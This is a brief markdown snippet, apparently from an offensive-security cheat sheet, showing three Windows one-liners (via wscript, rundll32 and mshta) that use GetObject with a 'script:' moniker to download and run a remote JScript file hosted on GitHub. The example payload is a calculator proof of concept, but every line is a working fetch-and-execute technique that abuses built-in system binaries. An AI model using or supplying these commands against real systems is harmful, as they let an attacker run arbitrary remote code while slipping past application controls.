#### GetObject

wscript/cscript <br><br>
`echo GetObject("script:https://raw.githubusercontent.com/sailay1996/misc-bin/master/calc.js") > test.js && wscript.exe test.js`<br>
<br>
rundll32<br><br>
`rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/sailay1996/misc-bin/master/calc.js")`
<br>
<br>
mshta 
<br><br>
`mshta.exe javascript:GetObject("script:https://raw.githubusercontent.com/sailay1996/misc-bin/master/calc.js …");close();`
